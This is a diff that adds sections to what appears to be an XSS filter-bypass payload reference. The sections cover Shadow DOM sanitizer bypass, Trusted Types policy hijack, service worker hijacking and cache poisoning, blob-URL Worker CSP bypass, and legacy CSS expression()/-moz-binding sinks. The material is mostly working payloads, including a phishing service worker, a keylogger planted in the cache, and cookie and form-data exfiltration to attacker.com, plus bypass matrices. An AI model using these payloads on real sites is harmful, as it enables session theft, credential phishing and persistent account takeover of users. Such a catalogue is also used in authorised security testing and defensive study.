@@ -1794,3 +1794,306 @@ onerror=top[/al/.source+/ert/.source];throw document.cookie
 | Nonce-based CSP on PHP pages | `max_input_vars` drops CSP header entirely | 1001+ params → PHP E_WARNING → `header()` fails silently |
 | Nonce-based CSP + CSS/HTML injection | CSS attribute selector oracle leaks nonce characters | Inject `<style>script[nonce^="X"]{...}` × all chars → reconstruct nonce |
 | `script-src 'self'` without `object-src` | `<object data=data:text/html;base64,...>` executes scripts | `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">` |
+
+---
+
+## Declarative Shadow DOM XSS — Sanitizer Bypass
+
+**Type:** stored / reflected
+**Filter bypassed:** HTML sanitizers (DOMPurify < 3.2.x, HtmlSanitizer, sanitize-html) that walk the parsed DOM tree but fail to recurse into declarative shadow roots; also depth-limit mutation bypass
+**Bypass logic:** Three attack paths: (1) Sanitizers that allow `<template>` tags but don't check for the `shadowrootmode` attribute — the browser creates a shadow root from the template content, attaching the inner tree in a separate shadow DOM that the sanitizer never walked. DOMPurify's tree-prune step never visits the shadow root's children. (2) Node depth limit mutation: Chromium's HTML parser has a 512-node depth limit; placing a `<template>` at depth 513+ causes its children to be "escaped" into the parent document context at parse time — pulling a `<script>` out of the template's unsanitized tree. (3) `setHTMLUnsafe()` (cross-browser since September 2025) is a new DOM API that explicitly performs no sanitization; code using it instead of `innerHTML` is immediately vulnerable to any HTML injection.
+**Attack chain:** User input reaches sanitizer → shadow DOM bypass passes `<script>` through undetected → output inserted via `innerHTML` or `setHTMLUnsafe()` → XSS fires → cookie theft → ATO
+
+**Payload:**
+```html
+<!-- Path 1: shadowrootmode attribute — sanitizer tree-walk never enters shadow root -->
+<div><template shadowrootmode="open"><script>alert(document.cookie)</script></template></div>
+
+<!-- Closed shadow root — even harder for sanitizers to detect -->
+<div><template shadowrootmode="closed"><img src=x onerror=alert(1)></template></div>
+
+<!-- Path 2: Node depth limit mutation (513+ nested tags push template contents out) -->
+<div><div><div><!-- repeat <div> 509 more times -->
+<template><script>alert(document.cookie)</script></template>
+<!-- Chromium parser depth limit: template children escape into parent context -->
+
+<!-- Path 3: setHTMLUnsafe() sink — zero sanitization by design -->
+<!-- Find in source: -->
+element.setHTMLUnsafe('<img src=x onerror=alert(document.cookie)>');
+<!-- Also dangerous: -->
+shadowRoot.setHTMLUnsafe('<script>alert(1)<\/script>');
+
+<!-- Detection: grep for setHTMLUnsafe in JS bundles -->
+grep -r "setHTMLUnsafe\|shadowrootmode" . --include="*.js"
+```
+
+**Source:** https://github.com/mganss/HtmlSanitizer/security/advisories/GHSA-j92c-7v7g-gj3f ; https://speakerdeck.com/masatokinugawa/shadow-dom-and-security-exploring-the-boundary-between-light-and-shadow ; https://developer.mozilla.org/en-US/docs/Web/API/Element/setHTMLUnsafe
+
+---
+
+## Trusted Types Default Policy Hijack
+
+**Type:** DOM / stored
+**Filter bypassed:** `require-trusted-types-for 'script'` CSP — enforces that strings cannot reach DOM sinks without passing through a Trusted Types policy; bypassed by racing to create a permissive `default` policy before the app does, or by DOM clobbering the app's policy sanitizer
+**Bypass logic:** Three paths: (1) **Policy name race:** If the app uses `require-trusted-types-for 'script'` but does not restrict policy names via `trusted-types [name]`, any script (including third-party analytics) can call `trustedTypes.createPolicy('default', {createHTML: s => s})` — creating a permissive pass-through policy. All subsequent string-to-sink assignments pass through this identity function, satisfying TT enforcement while performing no sanitization. (2) **Third-party policy hijack:** If a CDN-loaded analytics or chat widget creates a `default` policy with `createHTML: s => s` before the app's sanitizing policy is registered, the permissive policy wins — because the `default` policy can only be created once. (3) **DOM clobbering the sanitizer:** If the app's TT policy reads its sanitizer function from a config object (e.g., `window.ttConfig.sanitizer`), injecting `<a id=ttConfig><a id=ttConfig name=sanitizer href="javascript:alert(1)">` clobbers `window.ttConfig.sanitizer` with an anchor element, causing the policy's `createHTML` to fail or return the attacker URL.
+**Attack chain:** TT policy race → permissive `default` policy installed → `element.innerHTML = "<img src=x onerror=alert(1)>"` passes TT enforcement → XSS fires → ATO
+
+**Payload:**
+```javascript
+// Path 1: Create permissive default policy (if trusted-types directive is absent/wildcard)
+// Works when CSP has "require-trusted-types-for 'script'" but NO "trusted-types" directive
+const policy = trustedTypes.createPolicy('default', {
+  createHTML:      s => s,   // identity — no sanitization
+  createScript:    s => s,
+  createScriptURL: s => s
+});
+// Now all TT-enforced sinks accept plain strings → full XSS
+
+// Verify whether default policy can be hijacked:
+try {
+  trustedTypes.createPolicy('default', { createHTML: s => s });
+  console.log('[!] Default TT policy hijackable — no restriction in CSP');
+} catch(e) {
+  console.log('[*] Default policy already exists or policy name restricted');
+}
+
+// Path 2: Detect third-party policy permissiveness
+// Check which policies are registered and what their createHTML does:
+console.log([...trustedTypes.getPolicyNames()]);
+
+// Path 3: DOM clobbering the sanitizer config (HTML injection, no JS)
+// Target code pattern:
+//   const policy = trustedTypes.createPolicy('app', {
+//     createHTML: window.ttConfig.sanitize   ← reads from window
+//   });
+// Inject (HTML only):
+```
+```html
+<a id=ttConfig><a id=ttConfig name=sanitize href="data:text/html,<img src=x onerror=alert(1)>">
+```
+```javascript
+// Detection: check CSP for Trusted Types misconfiguration
+// SECURE:   "require-trusted-types-for 'script'; trusted-types myPolicy"
+// INSECURE: "require-trusted-types-for 'script'"  (no trusted-types restriction)
+// INSECURE: "trusted-types *"  (wildcard — any policy name allowed)
+fetch(location.href).then(r => {
+  const csp = r.headers.get('content-security-policy');
+  if (csp && csp.includes('require-trusted-types') && !csp.includes('trusted-types ')) {
+    console.log('[!] TT enforced but policy names unrestricted — default hijack possible');
+  }
+});
+```
+
+**Source:** https://github.com/PortSwigger/trusted-types-checker ; https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/ ; https://www.w3.org/TR/trusted-types/
+
+---
+
+## Service Worker Hijacking via DOM Clobbering (No JS Required)
+
+**Type:** DOM / stored (HTML injection only — no script execution required for Path 1)
+**Filter bypassed:** Service worker install scripts that resolve their script URL via `document.getElementById()`; also Cache API (used from XSS context) for persistent SW cache poisoning across sessions
+**Bypass logic:** Two distinct paths — both different from Chain 4 (which registers a new SW from an XSS context): (1) **DOM clobbering path (no JS):** If the app's service worker registration code calls `document.getElementById('sw-config').href` or `.getAttribute('data-src')` to find the SW script URL, injecting `<a id=sw-config href="https://attacker.com/evil-sw.js">` clobbers that lookup without any JavaScript. The legitimate SW is then registered pointing at the attacker's script. Since service workers persist across sessions and can intercept all fetches, this is critical impact from HTML-only injection. (2) **Cache poisoning path (from XSS):** Use `caches.open()` to overwrite an asset that an existing SW serves from cache (e.g., `/js/app.js`). The poisoned cache entry survives the XSS session ending — every subsequent user visit loads the malicious JS via the legitimate SW.
+**Attack chain (Path 1):** HTML injection → clobber `getElementById('sw-config')` → app registers attacker SW → SW intercepts all fetches → persistent phishing/keylogging on all future visits (no further JS execution needed)
+**Attack chain (Path 2):** XSS → Cache API poisons `/js/app.js` in existing SW cache → SW serves poisoned JS to all future page loads → persistent ATO that survives XSS session end
+
+**Payload:**
+```html
+<!-- Path 1: DOM clobbering the SW registration URL (HTML only) -->
+<!-- Target code pattern being exploited: -->
+<!--   var swUrl = document.getElementById('sw-config').href;  -->
+<!--   navigator.serviceWorker.register(swUrl);                 -->
+
+<!-- Inject this (pure HTML, passes most sanitizers): -->
+<a id=sw-config href="https://attacker.com/evil-sw.js">
+```
+
+```javascript
+// evil-sw.js (served from attacker.com) — intercepts login page:
+self.addEventListener('fetch', e => {
+  if (e.request.url.includes('/login')) {
+    e.respondWith(new Response(
+      '<html><body><form action="https://attacker.com/steal" method=POST>' +
+      'Username: <input name=u><br>Password: <input name=p type=password>' +
+      '<br><button>Sign In</button></form></body></html>',
+      { headers: { 'Content-Type': 'text/html' } }
+    ));
+  }
+});
+// Registers on first visit → serves phishing form on every subsequent /login visit
+
+// Path 2: Cache poisoning from XSS context
+// Overwrites /js/app.js in the existing SW cache — persists after XSS session ends:
+caches.open('app-v1').then(cache => {
+  const backdoor = `
+    document.addEventListener('submit', e => {
+      new FormData(e.target).forEach((v,k) => {
+        fetch('https://attacker.com/f?'+k+'='+encodeURIComponent(v), {mode:'no-cors'});
+      });
+    });
+  `;
+  cache.put('/js/app.js', new Response(
+    new Blob([backdoor], {type: 'application/javascript'}),
+    { headers: { 'Content-Type': 'application/javascript' } }
+  ));
+});
+// Every future visitor gets the keylogger via the poisoned SW cache entry
+
+// Enumerate all caches to find poisoning targets:
+caches.keys().then(names => names.forEach(n => {
+  caches.open(n).then(c => c.keys().then(keys =>
+    keys.forEach(req => console.log(n, req.url))
+  ));
+}));
+```
+
+**Source:** https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering ; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+---
+
+## Web Worker Blob URL CSP Bypass
+
+**Type:** DOM / reflected (post-XSS script execution escalation)
+**Filter bypassed:** `script-src` CSP restricting external domains and blocking `unsafe-eval` — when `blob:` is not explicitly excluded from `script-src` or `worker-src`, blob URLs inherit same-origin trust and satisfy the policy
+**Bypass logic:** `URL.createObjectURL(new Blob([jsCode], {type:'application/javascript'}))` generates a `blob:https://target.com/...` URL that is same-origin with the page. CSPs that restrict `script-src` to `'self'` or specific hosts do not block same-origin `blob:` URLs unless `worker-src 'none'` is set or `blob:` is explicitly excluded. Web Workers spawned from blob URLs execute in the same-origin context with full access to `fetch()` (with credentials), IndexedDB, and postMessage to the main thread — enabling full data exfiltration even when classic inline `<script>` or `eval()` is blocked. This is an escalation technique: requires existing XSS or compromised dependency to create the blob.
+**Attack chain:** Existing XSS blocked by `unsafe-eval` / strict `script-src` → create blob Worker URL (same-origin, passes CSP) → Worker `fetch('/api/user', {credentials:'include'})` → postMessage results to main thread → exfil to attacker → ATO
+
+**Payload:**
+```javascript
+// Step 1: From XSS context — verify if blob: Workers are allowed
+// (Check for absence of "worker-src 'none'" or explicit "blob:" exclusion in CSP)
+fetch(location.href).then(r =>
+  console.log('[CSP]', r.headers.get('content-security-policy'))
+);
+
+// Step 2: Create Worker from blob URL (bypasses script-src 'self' when blob: not excluded)
+const workerSrc = `
+  // Worker context — no document.cookie, but full fetch() with credentials
+  async function exfil() {
+    const res = await fetch('/api/v1/user', { credentials: 'include' });
+    const data = await res.json();
+    self.postMessage(data);
+  }
+  exfil();
+`;
+const blob    = new Blob([workerSrc], { type: 'application/javascript' });
+const blobUrl = URL.createObjectURL(blob);   // → blob:https://target.com/<uuid>
+const worker  = new Worker(blobUrl);          // CSP: blob: same-origin → passes 'self'
+
+// Step 3: Receive exfiltrated data in main thread (has cookie access)
+worker.onmessage = e => {
+  fetch('https://attacker.com/steal?d=' + btoa(JSON.stringify(e.data)), {mode:'no-cors'});
+};
+
+// Alternative: blob iframe (exfils cookies via parent access, bypasses frame-src too)
+const htmlBlob = new Blob(
+  [`<script>parent.postMessage(document.cookie,'*')<\/script>`],
+  { type: 'text/html' }
+);
+const frame = document.createElement('iframe');
+frame.src = URL.createObjectURL(htmlBlob);  // blob: iframe, same-origin
+document.body.appendChild(frame);
+window.addEventListener('message', e =>
+  fetch('https://attacker.com/c?d=' + btoa(e.data), {mode:'no-cors'})
+);
+
+// CSP patterns where this works vs. doesn't:
+// VULNERABLE:  "script-src 'self'"                (no blob: exclusion, no worker-src)
+// VULNERABLE:  "script-src 'self' 'nonce-XYZ'"    (blob: allowed implicitly)
+// PROTECTED:   "script-src 'self'; worker-src 'none'"
+// PROTECTED:   "script-src 'self'; child-src 'none'; worker-src 'none'"
+```
+
+**Source:** https://centralcsp.com/articles/csp-blob-scheme ; https://github.com/wireapp/wire-webapp/security/advisories/GHSA-382j-mmc8-m5rw ; https://lab.ctbb.show/research/Exploiting-web-worker-XSS-with-blobs
+
+---
+
+## CSS expression() and -moz-binding — Legacy Browser XSS Sinks
+
+**Type:** reflected / stored (legacy browser contexts)
+**Filter bypassed:** Modern-browser-focused sanitizers and WAFs that don't test IE/legacy-Firefox CSS execution paths; enterprise intranet scanners that target modern browsers
+**Bypass logic:** Two legacy execution paths viable against IE 5–8 and pre-Quantum Firefox: (1) **IE `expression()`:** Internet Explorer 5 through 8 evaluate JavaScript expressions embedded in CSS property values via `expression(jsCode)`. The expression is re-evaluated on every style computation (resize, scroll, DOM change) making it a persistent execution loop. Sanitizers that permit `<style>` tags and test only on Chrome/Firefox miss this entirely. CSS injection points (color pickers, font URLs, user-defined themes) are the attack surface. (2) **Firefox `-moz-binding`:** Pre-Firefox 57 (pre-Quantum) support `-moz-binding` — a proprietary CSS extension that loads an XBL (XML Binding Language) document from a URL and attaches JavaScript behavior to the matched element. Requires the attacker to host the XBL file but requires no existing JS execution on target. Both remain relevant in corporate intranets, banking portals, and legacy government systems.
+**Attack chain:** CSS injection → `expression()` or `-moz-binding` URL → JS execution in legacy browser → cookie exfil → ATO
+
+**Payload:**
+```css
+/* IE 5-8: expression() — fires on every style recomputation */
+/* In <style> block injection: */
+div { width: expression(alert(document.cookie)); }
+body { background-color: expression(new Image().src='//attacker.com/?c='+document.cookie); }
+
+/* Compact one-shot cookie exfil (self-disabling via var): */
+body { color: expression(x?0:(x=1,fetch('//attacker.com?c='+document.cookie))); }
+```
+```html
+<!-- In inline style attribute injection (IE): -->
+<div style="width:expression(alert(1))">
+<p style="background:expression(new Image().src='//attacker.com?c='+document.cookie)">
+
+<!-- Old Firefox: -moz-binding loads external XBL -->
+<style>
+  #target { -moz-binding: url('https://attacker.com/xss.xml#xss'); }
+</style>
+```
+```xml
+<!-- attacker.com/xss.xml (XBL document with JS constructor): -->
+<?xml version="1.0"?>
+<bindings xmlns="http://www.mozilla.org/xbl">
+  <binding id="xss">
+    <implementation>
+      <constructor>
+        new Image().src='https://attacker.com/c?'+document.cookie;
+      </constructor>
+    </implementation>
+  </binding>
+</bindings>
+```
+```
+Test targets:
+- IE11 / IE-compatibility-mode Edge (corporate intranets)
+- IE 8 on Windows 7 (still found in banking/government)
+- Firefox ESR < 57 (pre-Quantum; rare but exists in locked-down corporate deployments)
+- Detection: check User-Agent logs for MSIE/Trident/rv:11 strings
+```
+
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md ; https://developer.mozilla.org/en-US/docs/Web/CSS/-moz-binding
+
+---
+
+## Bypass Matrix (Updated 2026-05-28)
+
+### New Entries — Techniques Added 2026-05-28
+
+| Filter / Defense | Bypass Technique | Payload Example |
+|-----------------|------------------|-----------------|
+| HTML sanitizer (tree-walk) | Declarative Shadow DOM (`shadowrootmode`) | `<template shadowrootmode="open"><script>alert(1)</script></template>` |
+| Sanitizer (depth-unaware) | Template node-depth limit mutation (512+) | 513 nested `<div>` → template child escapes to parent context |
+| `innerHTML` replacement | `setHTMLUnsafe()` new sink (no sanitization) | `element.setHTMLUnsafe('<img src=x onerror=alert(1)>')` |
+| `require-trusted-types-for 'script'` (no name restriction) | Permissive `default` TT policy race | `trustedTypes.createPolicy('default',{createHTML:s=>s})` |
+| `require-trusted-types-for 'script'` (config via DOM) | DOM clobbering TT sanitizer config | `<a id=ttConfig><a id=ttConfig name=sanitize href="data:...">` |
+| `script-src 'self'` (no `worker-src 'none'`) | Web Worker blob URL bypass | `new Worker(URL.createObjectURL(new Blob([js])))` — blob: is same-origin |
+| Service worker install URL via `getElementById` | DOM clobbering SW registration (HTML-only) | `<a id=sw-config href="https://attacker.com/evil-sw.js">` |
+| CSP + WAF on HTTP (misses SW cache) | SW cache poisoning from XSS context | `caches.open('app-v1').then(c => c.put('/js/app.js', malicious))` |
+| Modern-browser-only scanner | IE `expression()` CSS sink | `<div style="width:expression(alert(1))">` (IE 5–8) |
+| Modern-browser-only scanner | Firefox `-moz-binding` CSS load | `#el{-moz-binding:url('//attacker.com/xss.xml#xss')}` (pre-FF57) |
+
+### New Sinks Documented 2026-05-28
+
+| Sink | Context | Notes |
+|------|---------|-------|
+| `element.setHTMLUnsafe()` | Modern browsers (Sept 2025+) | New DOM API; explicitly no sanitization — always exploitable with HTML injection |
+| `shadowRoot.setHTMLUnsafe()` | Shadow DOM rendering | Same as above; used in Lit/FAST/Stencil web component frameworks |
+| `<template shadowrootmode>` contents | Declarative Shadow DOM | Shadow root children invisible to sanitizer tree-walk |
+| `trustedTypes.createPolicy('default', ...)` | Trusted Types enforcement | Permissive default policy satisfies TT enforcement with identity function |
+| `CSS expression()` | IE 5–8 only | Fires on every style recomputation; persistent loop |
+| `CSS -moz-binding` | Firefox < 57 only | Loads external XBL; JS executed via `<constructor>` |
+| `caches.put()` (Cache API) | SW cache poisoning | Overwrites SW-served assets; persists after XSS session ends |
+| `new Worker(blobUrl)` | Web Worker | blob: URL inherits page origin; passes `script-src 'self'` |
+
+### CSP Configurations — New Weaknesses (2026-05-28)
+
+| CSP Configuration | Weakness | Bypass |
+|------------------|----------|--------|
+| `require-trusted-types-for 'script'` (no `trusted-types` name restriction) | Any script can create `default` policy | Race to create `trustedTypes.createPolicy('default',{createHTML:s=>s})` |
+| `script-src 'self'` without `worker-src` | `blob:` URLs are same-origin, pass `'self'` for workers | `new Worker(URL.createObjectURL(new Blob([payload])))` |
+| `script-src 'self'; worker-src blob:` | Explicit `blob:` allowance for workers | Same blob Worker technique, explicitly allowed |
+| Any CSP (from XSS context with existing SW) | SW cache API accessible from XSS — no CSP governs cache writes | Poison SW cache entries → persistent JS on future page loads |
